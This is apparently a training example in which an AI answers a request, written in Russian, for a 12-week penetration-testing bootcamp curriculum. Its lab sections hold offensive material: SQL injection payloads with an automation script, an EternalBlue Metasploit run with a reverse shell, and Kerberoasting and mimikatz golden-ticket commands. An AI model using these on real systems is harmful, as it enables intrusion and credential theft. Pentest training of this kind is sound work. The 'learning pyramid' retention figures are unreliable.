# Example: Curriculum Design (Security Engineering Bootcamp)

## User Request

```
Спроектируй curriculum для 12-week cybersecurity bootcamp с нуля до junior penetration tester.
```

## Reasoning

**Domain:** Education (Curriculum design, learning path)
**Complexity:** Complex
**Model:** Opus

## Response

---

# 12-Week Cybersecurity Bootcamp Curriculum

**Target Audience:** Career changers, IT professionals transitioning to security
**Entry Level:** Basic IT knowledge (Linux commands, networking basics)
**Exit Level:** Junior Penetration Tester / Security Analyst
**Format:** Full-time (40 hours/week)
**Total Hours:** 480 hours

---

## Curriculum Design Principles

```
┌─────────────────────────────────────────────────────────────────────────┐
│  LEARNING PYRAMID (Retention Rates)                                     │
├─────────────────────────────────────────────────────────────────────────┤
│  📖 Lecture (5% retention)          │  Lowest retention                 │
│  📚 Reading (10% retention)          │  ↓                                │
│  🎥 Audiovisual (20% retention)      │                                   │
│  🧪 Demonstration (30% retention)    │                                   │
│  💬 Discussion (50% retention)       │                                   │
│  🛠️ Practice (75% retention)         │                                   │
│  🎓 Teaching Others (90% retention)  │  Highest retention                │
└─────────────────────────────────────────────────────────────────────────┘
```

**Our Approach:**
- 20% Theory (lectures, reading)
- 30% Demonstrations (live hacking demos)
- 50% Hands-on Labs (students hack real systems)

---

## Week-by-Week Breakdown

### **Phase 1: Foundations (Weeks 1-3)**

#### Week 1: Linux & Networking Fundamentals

**Learning Objectives:**
- Navigate Linux command line fluently
- Understand TCP/IP stack and common protocols
- Use Wireshark to analyze network traffic

**Daily Schedule:**

| Day | Topic | Theory | Lab | Assessment |
|-----|-------|--------|-----|------------|
| Mon | Linux Essentials | 2h | 4h | Quiz (20 questions) |
| Tue | Shell Scripting | 1h | 5h | Script challenge |
| Wed | TCP/IP Stack | 2h | 4h | Packet analysis lab |
| Thu | HTTP/HTTPS Deep Dive | 1h | 5h | Build HTTP server |
| Fri | Wireshark Analysis | 1h | 4h | Capture-the-Flag (CTF) |

**Lab 1.1:** Linux Command Line Mastery
```bash
# Students complete 50 command challenges
# Example: Find all SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Example: Extract IPs from log file
grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" access.log | sort -u
```

**Lab 1.2:** Wireshark Packet Analysis
```
Task: Analyze pcap file and answer:
1. What is the victim's IP address?
2. What malware was downloaded?
3. What C2 server was contacted?
4. What data was exfiltrated?
```

**Assessment:** Week 1 CTF (4 hours)
- 5 challenges (Linux, networking, Wireshark)
- Pass threshold: 3/5 solved

---

#### Week 2: Web Application Fundamentals

**Learning Objectives:**
- Understand HTTP request/response cycle
- Identify OWASP Top 10 vulnerabilities
- Use Burp Suite for web app testing

**Daily Schedule:**

| Day | Topic | Theory | Lab | Project |
|-----|-------|--------|-----|---------|
| Mon | HTTP & REST APIs | 2h | 4h | Build REST API |
| Tue | OWASP Top 10 Overview | 3h | 3h | Vuln demos |
| Wed | Burp Suite Basics | 1h | 5h | Intercept & modify |
| Thu | SQL Injection | 1h | 5h | Exploit SQLi labs |
| Fri | XSS & CSRF | 1h | 5h | Exploit XSS labs |

**Lab 2.1:** SQL Injection Practice
```sql
-- Vulnerable login query
SELECT * FROM users WHERE username='$username' AND password='$password'

-- Tasks:
1. Bypass authentication
2. Extract database schema
3. Dump users table
4. Write a file to disk
```

**Lab 2.2:** Build Exploitation Scripts
```python
# sqli_exploit.py - Automate SQL injection
import requests

url = "http://vulnerable-site.local/login"

# Test payloads
payloads = [
    "admin' OR '1'='1",
    "admin'--",
    "' UNION SELECT 1,2,3--",
]

for payload in payloads:
    data = {"username": payload, "password": "x"}
    response = requests.post(url, data=data)

    if "Welcome" in response.text:
        print(f"[+] Success: {payload}")
        break
```

**Project:** Hack WebGoat (OWASP vulnerable app)
- Complete 20 challenges
- Document findings in report

---

#### Week 3: Network Security & Scanning

**Learning Objectives:**
- Perform network reconnaissance
- Identify open ports and services
- Exploit basic network vulnerabilities

**Lab 3.1:** Nmap Mastery
```bash
# Port scan techniques
nmap -sS -p- 192.168.1.0/24        # SYN scan, all ports
nmap -sV -sC 192.168.1.100         # Version detection, scripts
nmap --script vuln 192.168.1.100   # Vulnerability scan

# Students must:
1. Find all live hosts in network
2. Identify services and versions
3. Detect vulnerable services
```

**Lab 3.2:** Exploit Vulnerable Services
```bash
# Example: Exploit EternalBlue (MS17-010)
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOST 192.168.1.50
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.10
exploit
```

**Assessment:** Phase 1 Final Exam
- 8-hour penetration test on vulnerable network
- Written report required (20 pages)
- Pass: 70% of vulnerabilities found

---

### **Phase 2: Offensive Security (Weeks 4-8)**

#### Week 4: Web Application Exploitation (Advanced)

**Topics:**
- Authentication bypass techniques
- Session hijacking
- API security testing
- JWT attacks

**Capstone Lab:** Full web app pentest
```
Target: E-commerce site (15 vulnerabilities)
Time: 16 hours (2 days)
Deliverable: Professional pentest report

Must Find:
- SQL injection (3 instances)
- XSS (2 instances)
- IDOR (Insecure Direct Object Reference)
- JWT algorithm confusion
- File upload vulnerability
- SSRF (Server-Side Request Forgery)
```

---

#### Week 5: System Exploitation & Privilege Escalation

**Learning Objectives:**
- Exploit buffer overflows
- Escalate privileges on Linux/Windows
- Maintain persistence

**Lab 5.1:** Linux Privilege Escalation
```bash
# Enumeration scripts
./LinPEAS.sh
./linuxprivchecker.py

# Common vectors:
1. SUID binaries
2. Sudo misconfigurations
3. Kernel exploits
4. Cron jobs with weak permissions
```

**Lab 5.2:** Windows Privilege Escalation
```powershell
# Enumeration
Import-Module .\PowerUp.ps1
Invoke-AllChecks

# Common vectors:
1. Unquoted service paths
2. AlwaysInstallElevated
3. DLL hijacking
4. Token impersonation
```

---

#### Week 6: Active Directory Exploitation

**Learning Objectives:**
- Enumerate AD environments
- Perform Kerberos attacks
- Pivot through networks
- Dump credentials

**Lab 6.1:** Kerberoasting
```bash
# Request TGS tickets
GetUserSPNs.py -request -dc-ip 192.168.1.10 domain.local/user

# Crack tickets offline
hashcat -m 13100 tickets.txt rockyou.txt
```

**Lab 6.2:** Golden Ticket Attack
```powershell
# Dump krbtgt hash
mimikatz # lsadump::lsa /inject /name:krbtgt

# Create golden ticket
mimikatz # kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-... /krbtgt:hash /ticket:golden.kirbi
```

---

#### Week 7-8: Capstone Project (Simulated Enterprise Pentest)

**Scenario:**
```
Client: FinTech Corp
Assets:
- External web applications (3)
- Internal network (50 hosts)
- Active Directory domain
- Cloud infrastructure (AWS)

Your Mission:
1. External reconnaissance
2. Exploit web apps → foothold
3. Pivot to internal network
4. Escalate privileges
5. Compromise domain admin
6. Document ALL findings

Time: 80 hours (2 weeks)
Deliverable: Executive summary + technical report (50+ pages)
```

**Assessment Rubric:**
| Criteria | Weight | Description |
|----------|--------|-------------|
| Findings Quality | 40% | Severity, impact, proof-of-concept |
| Report Quality | 30% | Clarity, screenshots, remediation |
| Methodology | 20% | Approach, tooling, professionalism |
| Presentation | 10% | Present findings to "client" (instructors) |

**Pass Threshold:** 75/100 points

---

### **Phase 3: Defense & Career Prep (Weeks 9-12)**

#### Week 9: Blue Team Fundamentals

**Learning Objectives:**
- Detect common attack patterns
- Analyze logs (SIEM)
- Respond to incidents

**Lab 9.1:** Log Analysis Challenge
```bash
# Given: 1 million log lines, 1 breach hidden
# Find: Attacker IP, initial access method, data exfiltrated

zcat /var/log/apache2/access.log.*.gz | \
  grep -E "POST|../../|base64|cmd=" | \
  awk '{print $1}' | sort | uniq -c | sort -nr
```

**Lab 9.2:** Write Detection Rules (Sigma)
```yaml
# sigma_rule.yml - Detect Mimikatz usage
title: Mimikatz Usage Detected
description: Detects Mimikatz credential dumping
logsource:
  product: windows
  service: sysmon
detection:
  selection:
    EventID: 10
    TargetImage|endswith: 'lsass.exe'
    GrantedAccess: '0x1010'
  condition: selection
level: critical
```

---

#### Week 10: Report Writing & Communication

**Learning Objectives:**
- Write executive summaries
- Document technical findings
- Present to non-technical audience

**Lab 10.1:** Report Review & Critique
```markdown
# Students review 5 real pentest reports
# Critique: What's good? What's missing?

Good Report Checklist:
- [ ] Executive summary (1 page, non-technical)
- [ ] Methodology (tools, approach)
- [ ] Findings (ranked by severity)
- [ ] Proof-of-concept (screenshots, code)
- [ ] Remediation recommendations (specific, actionable)
- [ ] Appendices (raw data, tool output)
```

**Lab 10.2:** Presentation Simulation
```
Format: 30-minute presentation to "C-level executives"
Content:
- Top 3 critical findings
- Business impact ($$$ at risk)
- Remediation timeline
- Q&A

Grading:
- Clarity (no jargon)
- Confidence
- Time management
```

---

#### Week 11: Certifications Prep (OSCP Focus)

**Learning Objectives:**
- Practice OSCP-style challenges
- Time management (Proctored 24-hour exam simulation)
- Reporting under time pressure

**Mock OSCP Exam:**
```
Format: 24-hour exam
Targets:
- 10-point Buffer Overflow machine
- 25-point Easy machine
- 20-point Medium machine (x2)
- 25-point Hard machine

Pass: 70 points + documentation

Students attempt 3× over Week 11
```

---

#### Week 12: Career Prep & Final Showcase

**Activities:**
- Resume review (1-on-1)
- Mock interviews (technical + behavioral)
- LinkedIn profile optimization
- Final project presentations (demo day)

**Final Assessment:** Portfolio Review
```
Portfolio Must Include:
1. GitHub repos (3+ security tools/scripts)
2. Blog posts (5+ writeups)
3. HackTheBox / TryHackMe profile (20+ machines)
4. Certifications (OSCP attempted or passed)
5. Capstone project demo

Graduation Requirement: Portfolio approval
```

---

## Teaching Methodology

### 1. Flipped Classroom

**Traditional (BAD):**
```
Day 1: 6 hours of lecture on SQL injection
Day 2: 2 hours of lab practice

Problem: Students fall asleep, forget 80% by lab time
```

**Flipped Classroom (GOOD):**
```
Homework (night before): Watch 30-min video on SQL injection
Class (Day 1): 10-min Q&A, then 6 hours of hands-on labs

Result: Students learn by doing, instructor available for help
```

### 2. Spaced Repetition

```
Week 1: Introduce SQL injection
Week 3: SQL injection quiz (recall)
Week 5: SQL injection in CTF challenge (application)
Week 8: SQL injection in capstone (mastery)

Why: Revisiting concepts cements long-term memory
```

### 3. Peer Teaching

```
Format: Students pair up, teach each other weekly topics
Example:
- Alice teaches Bob about XSS
- Bob teaches Alice about CSRF

Benefit: Teaching = 90% retention (vs. 5% for lecture)
```

---

## Student Progress Tracking

```python
# progress_tracker.py - Track student performance

class Student:
    def __init__(self, name):
        self.name = name
        self.labs_completed = []
        self.ctf_points = 0
        self.assessments = {}

    def completion_rate(self):
        """% of labs completed."""
        total_labs = 50
        return (len(self.labs_completed) / total_labs) * 100

    def avg_assessment_score(self):
        """Average score across all assessments."""
        if not self.assessments:
            return 0
        return sum(self.assessments.values()) / len(self.assessments)

    def at_risk(self):
        """Flag students who need intervention."""
        return (
            self.completion_rate() < 70 or
            self.avg_assessment_score() < 60 or
            self.ctf_points < 500  # Threshold for Week 6
        )

# Example usage
alice = Student("Alice")
alice.labs_completed = [1, 2, 3, 5, 8]  # 5/50 labs
alice.assessments = {"Week 1": 85, "Week 2": 60}
alice.ctf_points = 300

if alice.at_risk():
    print(f"⚠️  {alice.name} needs 1-on-1 support")
    print(f"   Completion: {alice.completion_rate():.0f}%")
    print(f"   Avg Score: {alice.avg_assessment_score():.0f}")
```

**Intervention Triggers:**
- <70% lab completion → Schedule 1-on-1 office hours
- <60% assessment avg → Offer tutoring or repeat week
- Low CTF points → Assign mentor (peer or TA)

---

## Success Metrics

### Student Outcomes (12 Months Post-Graduation):
- **Employment Rate:** 85% in security roles
- **Salary:** Avg $75K (junior pentester/analyst)
- **Certifications:** 60% pass OSCP within 6 months
- **Satisfaction:** 4.5/5.0 NPS score

### Program Metrics:
- **Completion Rate:** 80% (20% drop-out acceptable)
- **Daily Attendance:** >90%
- **Lab Completion:** >75% average
- **Capstone Pass:** >70% of students

---

## Common Curriculum Mistakes

| Mistake | Why Bad | Solution |
|---------|---------|----------|
| **Too much theory, not enough practice** | Students forget without hands-on | 20% theory, 80% practice |
| **No gradual difficulty curve** | Throw students into deep end → drop-out | Week 1 easy, Week 12 hard (scaffolding) |
| **Outdated content** | Teaching exploits from 2010 | Update quarterly, track CVEs |
| **No student tracking** | Can't identify struggling students early | Weekly progress dashboards |
| **Ignoring soft skills** | Students can hack but can't communicate | Weeks 10-12: reports, presentations |
| **No career support** | Students graduate, struggle to find jobs | Resume reviews, mock interviews, job board |

---

## Key Takeaways

1. **Learning Pyramid** — Practice (75%) > Lecture (5%)
2. **Flipped Classroom** — Watch videos at home, lab in class
3. **Spaced Repetition** — Revisit concepts every 2-3 weeks
4. **Peer Teaching** — Students teach each other (90% retention)
5. **Progress Tracking** — Flag at-risk students early (70% completion threshold)

**Curriculum Design Formula:**
```
20% Theory + 30% Demos + 50% Labs = High Retention
```

**Timeline:**
- Design: 3 months (research, syllabi, labs)
- Pilot cohort: 12 weeks (iterate based on feedback)
- Production: 4 cohorts/year (ongoing updates)

**Tools:** Canvas LMS, HackTheBox, TryHackMe, Notion, GitHub
